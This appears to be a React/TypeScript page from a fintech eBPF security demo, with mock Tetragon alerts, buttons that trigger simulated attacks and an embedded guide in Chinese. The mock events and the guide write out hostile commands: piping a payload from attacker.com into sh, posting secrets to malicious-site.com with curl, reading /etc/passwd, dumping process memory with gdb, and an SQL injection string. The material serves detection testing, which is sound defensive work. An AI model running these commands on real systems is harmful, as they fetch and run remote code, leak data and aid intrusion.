import React, { useState, useEffect, useMemo, useCallback } from 'react';
import {
  Row,
  Col,
  Card,
  Typography,
  Table,
  Tag,
  Badge,
  Button,
  Space,
  Divider,
  Alert,
  Timeline,
  Statistic,
  Progress,
  Switch,
  Input,
  Select,
  DatePicker,
  Tabs,
  Tooltip,
  message,
  Drawer,
} from 'antd';
import {
  SecurityScanOutlined,
  WarningOutlined,
  FileOutlined,
  GlobalOutlined,
  CodeOutlined,
  PlayCircleOutlined,
  StopOutlined,
  ReloadOutlined,
  ExportOutlined,
  SearchOutlined,
  ExperimentOutlined,
  EyeOutlined,
  SafetyCertificateOutlined,
  BugOutlined,
  ClockCircleOutlined,
  FileTextOutlined,
  KeyOutlined,
  LockOutlined,
  HddOutlined,
  NodeExpandOutlined,
  InfoCircleOutlined,
} from '@ant-design/icons';
import ReactMarkdown from 'react-markdown';
import styles from './Security.module.css';
import { useNotifications } from '../../contexts/NotificationContext';

// 導入安全測試組件
import SecurityTesting from './SecurityTesting';
// 導入Tetragon事件流組件
import TetragonEventStream from '../../components/TetragonEventStream';

const { Title, Text, Paragraph } = Typography;
const { Search } = Input;
const { Option } = Select;
const { RangePicker } = DatePicker;
const { TabPane } = Tabs;

// 定義事件詳情的類型
interface NetworkConnectionDetails {
  destination: string;
  port: number;
  protocol: string;
}

interface FileAccessDetails {
  filename: string;
  mode: string;
  userId: number;
}

interface CommandExecutionDetails {
  command: string;
  parentProcess: string;
  args: string[];
}

interface CryptoOperationDetails {
  operation: string;
  keyfile: string;
  algorithm: string;
}

// 聯合類型
type EventDetails = NetworkConnectionDetails | FileAccessDetails | CommandExecutionDetails | CryptoOperationDetails | Record<string, any>;

// 安全事件接口
interface SecurityEvent {
  key: string;
  timestamp: string;
  processId: number;
  processName: string;
  eventType: string;
  description: string;
  details: EventDetails;
  severity: string;
  service: string;
  podName: string;
  namespace: string;
  action: string;
}

// 模擬eBPF安全事件數據
const mockSecurityEvents: SecurityEvent[] = [
  {
    key: '1',
    timestamp: '2023-12-01 10:45:12.123',
    processId: 12345,
    processName: 'curl',
    eventType: 'NETWORK_CONNECTION',
    description: '外部DNS查詢到可疑域名',
    details: {
      destination: 'malicious-domain.com',
      port: 53,
      protocol: 'UDP',
    },
    severity: 'CRITICAL',
    service: 'payment-gateway',
    podName: 'payment-gateway-7d8f9c6b5-x2m4n',
    namespace: 'fintech-demo',
    action: 'ALLOWED',
  },
  {
    key: '2',
    timestamp: '2023-12-01 10:42:33.456',
    processId: 9876,
    processName: 'cat',
    eventType: 'FILE_ACCESS',
    description: '讀取敏感系統文件',
    details: {
      filename: '/etc/passwd',
      mode: 'READ',
      userId: 0,
    },
    severity: 'HIGH',
    service: 'trading-api',
    podName: 'trading-api-6f4d8c9b2-k8s7p',
    namespace: 'fintech-demo',
    action: 'ALLOWED',
  },
  {
    key: '3',
    timestamp: '2023-12-01 10:40:15.789',
    processId: 5432,
    processName: 'sh',
    eventType: 'COMMAND_EXECUTION',
    description: '執行可疑的shell命令',
    details: {
      command: 'curl http://attacker.com/payload | sh',
      parentProcess: 'risk-engine',
      args: ['-c', 'curl http://attacker.com/payload | sh'],
    },
    severity: 'CRITICAL',
    service: 'risk-engine',
    podName: 'risk-engine-5c7b8d4f6-m9n3x',
    namespace: 'fintech-demo',
    action: 'BLOCKED',
  },
  {
    key: '4',
    timestamp: '2023-12-01 10:38:45.012',
    processId: 7891,
    processName: 'openssl',
    eventType: 'CRYPTO_OPERATION',
    description: '加密操作異常',
    details: {
      operation: 'decrypt',
      keyfile: '/root/.private_key',
      algorithm: 'AES-256',
    },
    severity: 'MEDIUM',
    service: 'audit-service',
    podName: 'audit-service-8b5c7d9e1-p4q6r',
    namespace: 'fintech-demo',
    action: 'MONITORED',
  },
];

const securityGuideMarkdown = `# 安全測試模擬指南

本文檔詳細說明了 \`fintech-ebpf-demo\` 專案中內置的各項安全測試模擬功能。這些功能旨在模擬常見的攻擊行為，以驗證和展示 Cilium/Tetragon eBPF 的內核級監控、檢測與攔截能力。

## 核心概念

所有安全測試都遵循一個標準的流程：

1.  **使用者觸發**: 在前端 UI（如安全頁面）點擊一個測試按鈕。
2.  **前端請求**: 瀏覽器向後端 \`trading-api\` 服務發送一個特定的 API 請求（通常是 POST）。
3.  **後端執行**: \`trading-api\` 服務接收到請求後，其對應的處理函數 (Handler) 會在自身的 Pod 容器內部執行一個預設的、用於模擬攻擊的 Shell 命令。
4.  **eBPF 捕獲**: 部署在 Kubernetes 節點上的 Tetragon Agent，其 eBPF 探針會實時監控內核中的系統調用 (Syscall)。當後端容器執行惡意命令時，相關的系統調用（如 \`execve\`, \`openat\`, \`connect\`, \`write\` 等）會被 eBPF 探針捕獲。
5.  **事件上報與展示**: Tetragon 將捕獲到的原始系統調用轉化為結構化的安全事件，並根據預設或自訂的策略（Tracing Policy）判斷其是否為惡意行為。這些事件隨後可以通過 API、日誌或 WebSocket 推送給前端，最終展示在「eBPF 安全事件中心」頁面。

---

## 安全測試詳解

以下是每個安全測試端點的具體行為和流程分析。

### 1. 命令注入 (Command Injection)

- **Endpoint**: \`POST /api/v1/security/test/command\`
- **模擬場景**: 模擬攻擊者利用應用程式漏洞，注入並執行任意作業系統命令。這是最直接和危險的攻擊之一。
- **後端行為**: \`TestCommandInjection\` 處理函數會執行以下命令：
  \`\`\`bash
  ps aux
  \`\`\`
  這個命令會列出當前容器內運行的所有進程。雖然 \`ps\` 本身不是惡意命令，但它模擬了攻擊者在獲得執行權限後，進行信息收集（如查看正在運行的服務和進程）的典型第一步。
- **eBPF 監控點**:
  - \`execve\`: Tetragon 會捕獲到 \`trading-api\` 進程創建了一個新的子進程 \`ps\`。這是最關鍵的監控點。
  - \`openat\`, \`read\`: \`ps\` 命令為了獲取進程信息，會讀取 \`/proc\` 文件系統下的多個文件。

### 2. 任意文件訪問 (File Access)

- **Endpoint**: \`POST /api/v1/security/test/file\`
- **模擬場景**: 模擬攻擊者讀取或寫入伺服器上的敏感文件，如配置文件、密碼文件或原始碼。
- **後端行為**: \`TestFileAccess\` 處理函數會執行以下命令：
  \`\`\`bash
  cat /etc/passwd
  \`\`\`
  這個命令嘗試讀取包含系統用戶列表的 \`/etc/passwd\` 文件。這是一個典型的攻擊行為，用於收集目標系統的用戶信息。
- **eBPF 監控點**:
  - \`execve\`: 捕獲 \`cat\` 命令的執行。
  - \`openat\`: 捕獲對 \`/etc/passwd\` 文件的「打開」操作。Tetragon 的策略可以專門針對對此類敏感文件的訪問進行告警。
  - \`read\`, \`write\`: 捕獲文件的讀取和寫入操作，並可以顯示寫入的內容。

### 3. 網絡掃描 (Network Scan)

- **Endpoint**: \`POST /api/v1/security/test/network\`
- **模擬場景**: 模擬攻擊者在攻入一個容器後，對內部網絡進行橫向掃描，以發現其他可攻擊的服務。
- **後端行為**: \`TestNetworkScan\` 處理函數會執行以下命令：
  \`\`\`bash
  curl -s -o /dev/null http://risk-engine:30081/health
  \`\`\`
  這個命令會向內部網絡的 \`risk-engine\` 服務發起一個 HTTP 請求。這模擬了攻擊者探測內部服務是否存活以及開放了哪些端口。
- **eBPF 監控點**:
  - \`execve\`: 捕獲 \`curl\` 命令的執行。
  - \`connect\`: 捕獲 \`trading-api\` 容器嘗試與 \`risk-engine\` 容器建立 TCP 連接的系統調用，包括目標 IP 和端口。
  - \`send\`, \`recv\`: 捕獲網絡數據的發送與接收。

### 4. 敏感數據洩露 (Sensitive Data Leak)

- **Endpoint**: \`POST /api/v1/security/test/sensitive\`
- **模擬場景**: 模擬攻擊者將竊取到的敏感數據（如用戶資料、API 金鑰）通過網絡外傳到其控制的服務器。
- **後端行為**: \`TestSensitiveDataLeak\` 處理函數會執行以下命令：
  \`\`\`bash
  echo "user_id: 123, api_key: sec-xxxxxxxx" | curl -X POST -d @- http://malicious-site.com/log
  \`\`\`
  該命令將一條包含模擬敏感數據的字符串通過管道傳遞給 \`curl\`，並 POST到一個虛構的惡意域名 \`malicious-site.com\`。
- **eBPF 監控點**:
  - \`execve\`: 捕獲 \`echo\` 和 \`curl\` 命令的執行。
  - \`connect\`: 捕獲到對外部惡意域名 \`malicious-site.com\` 的連接請求。Tetragon 策略可以配置域名黑名單，對此類連接直接告警。
  - \`sendto\` / \`write\`: 可以捕獲到正在通過網絡發送的具體數據內容，從而識別出數據洩露。

### 5. SQL 注入 (SQL Injection)

- **Endpoint**: \`POST /api/v1/security/test/sql\`
- **模擬場景**: 模擬攻擊者通過應用輸入點注入惡意的 SQL 查詢，以繞過認證、竊取或篡改數據庫內容。
- **後端行為**: \`TestSQLInjection\` 處理函數會執行以下操作：
  它會在日誌中記錄一條模擬的惡意 SQL 查詢，但 **不會** 真正執行它，以避免破壞數據庫。
  \`\`\`go
  logger.WithField("query", "SELECT * FROM users WHERE id = '1' OR '1'='1';").Warn("模擬SQL注入攻擊")
  \`\`\`
- **eBPF 監控點**:
  - 此測試主要在應用層面產生日誌，而非觸發典型的內核級異常。但如果真的執行了惡意查詢，Tetragon 可以通過監控數據庫進程（如 \`postgres\`, \`mysql\`）的網絡通信來發現異常的查詢模式。

### 6. 權限提升 (Privilege Escalation)

- **Endpoint**: \`POST /api/v1/security/test/privilege\`
- **模擬場景**: 模擬攻擊者利用系統漏洞（如 SUID/GUID 程序）將自己從普通用戶權限提升到 root 權限。
- **後端行為**: \`TestPrivilegeEscalation\` 處理函數會執行以下命令：
  \`\`\`bash
  sudo -l
  \`\`\`
  該命令嘗試列出當前用戶可以通過 \`sudo\` 執行的命令。這是攻擊者在尋找提權路徑時的常用手段。
- **eBPF 監控點**:
  - \`execve\`: 捕獲 \`sudo\` 命令的執行。\`sudo\` 的執行本身就是一個值得關注的高權限操作。
  - \`setuid\`/\`setgid\`: 如果提權成功，Tetragon 會捕獲到進程的有效用戶 ID (EUID) 發生變化的系統調用。

### 7. 加密弱點 (Crypto Weakness)

- **Endpoint**: \`POST /api/v1/security/test/crypto\`
- **模擬場景**: 模擬應用程序使用了過時或不安全的加密算法，或者攻擊者嘗試對加密文件進行操作。
- **後端行為**: \`TestCryptoWeakness\` 處理函數會執行以下命令：
  \`\`\`bash
  openssl enc -aes-128-cbc -d -in /config/secrets.enc -out /tmp/secrets.dec
  \`\`\`
  該命令使用 \`openssl\` 工具嘗試解密一個（虛構的）加密文件。
- **eBPF 監控點**:
  - \`execve\`: 捕獲 \`openssl\` 命令的執行。
  - \`openat\`: 捕獲對加密文件 \`/config/secrets.enc\` 的讀取和對輸出文件 \`/tmp/secrets.dec\` 的寫入。可以配置策略來監控對特定加密庫或工具的調用。

### 8. 內存轉儲 (Memory Dump)

- **Endpoint**: \`POST /api/v1/security/test/memory\`
- **模擬場景**: 模擬攻擊者使用調試工具（如 gdb）附加到一個正在運行的進程上，並轉儲其內存，以竊取內存中的敏感信息（如密碼、私鑰）。
- **後端行為**: \`TestMemoryDump\` 處理函數會執行以下命令：
  \`\`\`bash
  gdb -p 1 -batch -ex "dump memory /tmp/proc1.dump 0x400000 0x401000"
  \`\`\`
  該命令嘗試使用 \`gdb\` 調試器附加到 PID 為 1 的進程（通常是容器的初始進程），並將其一小段內存轉儲到 \`/tmp/proc1.dump\` 文件。
- **eBPF 監控點**:
  - \`execve\`: 捕獲 \`gdb\` 命令的執行。在生產環境中，任何調試工具的執行都極其可疑。
  - \`ptrace\`: \`gdb\` 的核心是 \`ptrace\` 系統調用，Tetragon 可以精確捕獲哪個進程正在嘗試 \`ptrace\` 另一個進程，這是攻擊的核心指標。
`;

const Security: React.FC = () => {
  const [realTimeMode, setRealTimeMode] = useState(true);
  const [events, setEvents] = useState<SecurityEvent[]>(mockSecurityEvents);
  const [filteredEvents, setFilteredEvents] = useState<SecurityEvent[]>(mockSecurityEvents);
  const [loading, setLoading] = useState(false);
  const [selectedEventType, setSelectedEventType] = useState<string>('ALL');
  const [selectedSeverity, setSelectedSeverity] = useState<string>('ALL');
  const [drawerVisible, setDrawerVisible] = useState(false);
  const { addNotification } = useNotifications();

  // 模擬實時事件更新 (Tetragon 事件流)
  const handleNewEvent = useCallback((newEvent: SecurityEvent) => {
    setEvents(prev => {
      const newEvents = [newEvent, ...prev];
      return newEvents.length > 50 ? newEvents.slice(0, 50) : newEvents;
    });

    // 如果是高危或嚴重事件，則創建通知
    if (newEvent.severity === 'CRITICAL' || newEvent.severity === 'HIGH') {
      addNotification({
        type: newEvent.severity === 'CRITICAL' ? 'error' : 'warning',
        title: `[${newEvent.severity}] ${getEventTypeTag(newEvent.eventType).props.children}`,
        message: newEvent.description,
      });
    }
  }, [addNotification]);

  useEffect(() => {
    if (!realTimeMode) return;

    const interval = setInterval(() => {
      const eventTypes = ['NETWORK_CONNECTION', 'FILE_ACCESS', 'COMMAND_EXECUTION'];
      const selectedEventType = eventTypes[Math.floor(Math.random() * eventTypes.length)];
      const processNames = ['curl', 'wget', 'nc', 'python', 'sh', 'bash'];
      const selectedProcess = processNames[Math.floor(Math.random() * processNames.length)];
      const services = ['trading-api', 'risk-engine', 'payment-gateway', 'audit-service'];
      const selectedService = services[Math.floor(Math.random() * services.length)];
      
      // 根據事件類型生成對應的詳細信息
      let details: EventDetails;
      switch (selectedEventType) {
        case 'NETWORK_CONNECTION':
          details = {
            destination: `${Math.random() > 0.5 ? 'suspicious-site.com' : 'api.example.com'}`,
            port: Math.floor(Math.random() * 65535),
            protocol: Math.random() > 0.5 ? 'TCP' : 'UDP',
          } as NetworkConnectionDetails;
          break;
        case 'FILE_ACCESS':
          details = {
            filename: Math.random() > 0.5 ? '/etc/passwd' : '/tmp/data.txt',
            mode: Math.random() > 0.5 ? 'READ' : 'WRITE',
            userId: Math.floor(Math.random() * 1000),
          } as FileAccessDetails;
          break;
        case 'COMMAND_EXECUTION':
          details = {
            command: `${selectedProcess} script.sh`,
            parentProcess: selectedService,
            args: ['-c', 'some command'],
          } as CommandExecutionDetails;
          break;
        default:
          details = {};
      }

      // 模擬新的安全事件
      const newEvent: SecurityEvent = {
        key: `${Date.now()}`,
        timestamp: new Date().toLocaleString('zh-TW', {
          year: 'numeric',
          month: '2-digit',
          day: '2-digit',
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit',
          hour12: false
        }),
        processId: Math.floor(Math.random() * 99999),
        processName: selectedProcess,
        eventType: selectedEventType,
        description: '新檢測到的安全事件',
        details,
        severity: ['LOW', 'MEDIUM', 'HIGH', 'CRITICAL'][Math.floor(Math.random() * 4)],
        service: selectedService,
        podName: `${selectedService}-${Math.random().toString(36).substring(2, 8)}`,
        namespace: 'fintech-demo',
        action: ['ALLOWED', 'BLOCKED', 'MONITORED'][Math.floor(Math.random() * 3)],
      };

      handleNewEvent(newEvent);
    }, 5000);

    return () => clearInterval(interval);
  }, [realTimeMode, handleNewEvent]);

  // 過濾事件
  useEffect(() => {
    let filtered = events;
    
    if (selectedEventType !== 'ALL') {
      filtered = filtered.filter(event => event.eventType === selectedEventType);
    }
    
    if (selectedSeverity !== 'ALL') {
      filtered = filtered.filter(event => event.severity === selectedSeverity);
    }
    
    setFilteredEvents(filtered);
  }, [events, selectedEventType, selectedSeverity]);

  // 獲取嚴重性標籤
  const getSeverityTag = (severity: string) => {
    const severityConfig = {
      CRITICAL: { color: 'red', text: '嚴重' },
      HIGH: { color: 'orange', text: '高' },
      MEDIUM: { color: 'yellow', text: '中' },
      LOW: { color: 'green', text: '低' },
    };
    const config = severityConfig[severity as keyof typeof severityConfig] || { color: 'default', text: severity };
    return <Tag color={config.color}>{config.text}</Tag>;
  };

  // 獲取事件類型標籤
  const getEventTypeTag = (eventType: string) => {
    const typeConfig = {
      FILE_ACCESS: { color: 'blue', icon: <FileOutlined />, text: '文件訪問' },
      NETWORK_CONNECTION: { color: 'purple', icon: <GlobalOutlined />, text: '網絡連接' },
      COMMAND_EXECUTION: { color: 'red', icon: <CodeOutlined />, text: '命令執行' },
      CRYPTO_OPERATION: { color: 'gold', icon: <SecurityScanOutlined />, text: '加密操作' },
    };
    const config = typeConfig[eventType as keyof typeof typeConfig] || { 
      color: 'default', 
      icon: <WarningOutlined />, 
      text: eventType 
    };
    return (
      <Tag color={config.color} icon={config.icon}>
        {config.text}
      </Tag>
    );
  };

  // 獲取動作標籤
  const getActionTag = (action: string) => {
    const actionConfig = {
      ALLOWED: { color: 'green', text: '允許' },
      BLOCKED: { color: 'red', text: '阻止' },
      MONITORED: { color: 'blue', text: '監控' },
    };
    const config = actionConfig[action as keyof typeof actionConfig] || { color: 'default', text: action };
    return <Tag color={config.color}>{config.text}</Tag>;
  };

  // 觸發模擬攻擊
  const triggerMockAttack = async (attackType: string, attackName: string) => {
    setLoading(true);

    // 為每個攻擊類型定義符合後端 API 要求的請求體
    let requestBody = {};
    switch (attackType) {
      case 'command':
        // 後端 `TestCommandInjection` 需要 `command`
        requestBody = { command: 'ps aux' };
        break;
      case 'file':
        // 後端 `TestFileAccess` 需要 `file_path` 和 `action`
        requestBody = { file_path: '/etc/passwd', action: 'read' };
        break;
      case 'network':
        // 後端 `TestNetworkScan` 需要 `target` 和 `scan_type`
        requestBody = { target: 'risk-engine', scan_type: 'ping' };
        break;
      case 'sensitive':
        // 後端 `TestSensitiveDataLeak` 需要 `data_type`
        requestBody = { data_type: 'credit_card', action: 'log' };
        break;
      case 'sql':
        // 後端 `TestSQLInjection` 需要 `query`
        requestBody = { query: "SELECT * FROM users WHERE id = '1' OR '1'='1';" };
        break;
      case 'privilege':
        // 後端 `TestPrivilegeEscalation` 需要 `action`
        requestBody = { action: 'sudo' };
        break;
      case 'crypto':
        // 後端 `TestCryptoWeakness` 需要 `algorithm`
        requestBody = { algorithm: 'md5', data: 'my-secret-password' };
        break;
      case 'memory':
        // 後端 `TestMemoryDump` 需要 `dump_type`
        requestBody = { dump_type: 'process', pid: 1 };
        break;
      default:
        requestBody = {};
    }

    try {
      const response = await fetch(`/api/v1/security/test/${attackType}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(requestBody),
      });

      if (response.ok) {
        const result = await response.json();
        message.success(`已觸發 "${attackName}" 模擬`);
        addNotification({
          type: 'info',
          title: '安全測試已觸發',
          message: `您已成功執行 "${attackName}" 模擬攻擊。`,
        });
      } else {
        const errorData = await response.json();
        message.error(`觸發失敗: ${errorData.message || errorData.error || '未知錯誤'}`);
      }
    } catch (error) {
      message.error('觸發模擬攻擊失敗');
      console.error('觸發模擬攻擊失敗:', error);
    } finally {
      setLoading(false);
    }
  };

  const eventColumns = [
    {
      title: '時間',
      dataIndex: 'timestamp',
      key: 'timestamp',
      width: 180,
      render: (timestamp: string) => (
        <Text code style={{ fontSize: '12px' }}>
          {timestamp}
        </Text>
      ),
    },
    {
      title: '事件類型',
      dataIndex: 'eventType',
      key: 'eventType',
      width: 140,
      render: getEventTypeTag,
    },
    {
      title: '嚴重性',
      dataIndex: 'severity',
      key: 'severity',
      width: 80,
      render: getSeverityTag,
    },
    {
      title: '進程',
      key: 'process',
      width: 120,
      render: (record: SecurityEvent) => (
        <Space direction="vertical" size={0}>
          <Text strong>{record.processName}</Text>
          <Text type="secondary" style={{ fontSize: '12px' }}>
            PID: {record.processId}
          </Text>
        </Space>
      ),
    },
    {
      title: '描述',
      dataIndex: 'description',
      key: 'description',
      ellipsis: true,
    },
    {
      title: '服務',
      dataIndex: 'service',
      key: 'service',
      width: 120,
      render: (service: string) => <Tag>{service}</Tag>,
    },
    {
      title: '動作',
      dataIndex: 'action',
      key: 'action',
      width: 80,
      render: getActionTag,
    },
  ];

  // 統計數據
  const eventStats = useMemo(() => {
    return events.reduce((acc: { [key: string]: number }, event) => {
      acc[event.severity] = (acc[event.severity] || 0) + 1;
      acc.TOTAL = (acc.TOTAL || 0) + 1;
      return acc;
    }, { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0, TOTAL: 0 });
  }, [events]);

  return (
    <>
      <div className={styles.securityPage}>
        <Title level={2}><SecurityScanOutlined /> eBPF 安全事件中心</Title>
        <Paragraph type="secondary">基於 Cilium/Tetragon 的實時內核級安全事件監控與分析。</Paragraph>

        <Row gutter={[24, 24]}>
          {/* 左側主內容 */}
          <Col xs={24} lg={18}>
            <Card className={styles.statsCard}>
              <Row gutter={16}>
                <Col span={4}><Statistic title="事件總數" value={eventStats.TOTAL} /></Col>
                <Col span={4}><Statistic title="嚴重" value={eventStats.CRITICAL} valueStyle={{color: '#f5222d'}} /></Col>
                <Col span={4}><Statistic title="高危" value={eventStats.HIGH} valueStyle={{color: '#fa541c'}} /></Col>
                <Col span={4}><Statistic title="中危" value={eventStats.MEDIUM} valueStyle={{color: '#faad14'}} /></Col>
                <Col span={4}><Statistic title="低危" value={eventStats.LOW} valueStyle={{color: '#1890ff'}} /></Col>
              </Row>
            </Card>
            <Card>
              <div className={styles.filterBar}>
                <Search placeholder="搜索描述、服務或Pod名稱..." style={{ width: 300 }} />
                <Space>
                  <Select defaultValue="ALL" style={{ width: 120 }}>
                    <Option value="ALL">所有嚴重性</Option>
                    <Option value="CRITICAL">嚴重</Option>
                    <Option value="HIGH">高</Option>
                    <Option value="MEDIUM">中</Option>
                    <Option value="LOW">低</Option>
                  </Select>
                  <RangePicker />
                  <Button type="primary">篩選</Button>
                </Space>
              </div>

              <Table
                columns={eventColumns}
                dataSource={filteredEvents}
                rowClassName={(record) => styles[`severity-row-${record.severity.toLowerCase()}`]}
                expandable={{
                  expandedRowRender: record => <ExpandedEventDetails record={record} />,
                  rowExpandable: () => true,
                }}
              />
            </Card>
          </Col>

          {/* 右側控制面板 */}
          <Col xs={24} lg={6}>
            <Space direction="vertical" style={{ width: '100%' }} size="large">
              <Card title="控制面板">
                <div className={styles.controlItem}>
                  <Text>實時事件流</Text>
                  <Switch
                    checked={realTimeMode}
                    onChange={setRealTimeMode}
                    checkedChildren="開啟"
                    unCheckedChildren="關閉"
                  />
                </div>
              </Card>
              <Card 
                title={<Space><ExperimentOutlined />安全測試模擬</Space>}
                extra={<Button type="link" icon={<InfoCircleOutlined />} onClick={() => setDrawerVisible(true)}>說明</Button>}
              >
                <Paragraph type="secondary" style={{marginBottom: 16}}>點擊下方按鈕模擬不同類型的攻擊，以測試系統的檢測能力。</Paragraph>
                <Space direction="vertical" style={{ width: '100%' }}>
                  <Button block icon={<CodeOutlined />} loading={loading} onClick={() => triggerMockAttack('command', '命令注入')}>
                    進程信息收集
                  </Button>
                  <Button block icon={<FileTextOutlined />} loading={loading} onClick={() => triggerMockAttack('file', '任意文件訪問')}>
                    讀取敏感文件
                  </Button>
                  <Button block icon={<NodeExpandOutlined />} loading={loading} onClick={() => triggerMockAttack('network', '網絡掃描')}>
                    內部網絡掃描
                  </Button>
                  <Button block danger icon={<ExportOutlined />} loading={loading} onClick={() => triggerMockAttack('sensitive', '敏感數據洩露')}>
                    數據外洩到惡意網站
                  </Button>
                  <Button block danger icon={<LockOutlined />} loading={loading} onClick={() => triggerMockAttack('privilege', '權限提升')}>
                    探測Sudo權限
                  </Button>
                  <Button block icon={<KeyOutlined />} loading={loading} onClick={() => triggerMockAttack('crypto', '加密弱點')}>
                    嘗試解密文件
                  </Button>
                  <Button block danger icon={<HddOutlined />} loading={loading} onClick={() => triggerMockAttack('memory', '內存轉儲')}>
                    轉儲進程內存
                  </Button>
                  <Button block icon={<BugOutlined />} loading={loading} onClick={() => triggerMockAttack('sql', 'SQL注入')}>
                    記錄SQL注入日誌
                  </Button>
                </Space>
              </Card>
            </Space>
          </Col>
        </Row>
      </div>
      <Drawer
        title="安全測試模擬指南"
        placement="right"
        onClose={() => setDrawerVisible(false)}
        visible={drawerVisible}
        width={640}
      >
        <div className={styles.markdownContent}>
          {/* @ts-ignore */}
          <ReactMarkdown>{securityGuideMarkdown}</ReactMarkdown>
        </div>
      </Drawer>
    </>
  );
};

const ExpandedEventDetails: React.FC<{ record: any }> = ({ record }) => (
  <div className={styles.expandedDetails}>
    <Title level={5}>事件詳情</Title>
    <Paragraph><Text strong>描述: </Text>{record.description}</Paragraph>
    <Row gutter={24}>
      <Col span={12}>
        <Paragraph><ClockCircleOutlined /> <Text strong>時間戳: </Text>{record.timestamp}</Paragraph>
        <Paragraph><CodeOutlined /> <Text strong>服務: </Text>{record.service}</Paragraph>
      </Col>
      <Col span={12}>
        <Paragraph><BugOutlined /> <Text strong>進程: </Text>{record.processName}</Paragraph>
        <Paragraph><FileTextOutlined /> <Text strong>Pod: </Text>{record.podName}</Paragraph>
      </Col>
    </Row>
    <Title level={5} style={{marginTop: 16}}>上下文數據</Title>
    <pre className={styles.detailsJson}>{JSON.stringify(record.details, null, 2)}</pre>
  </div>
);

export default Security; 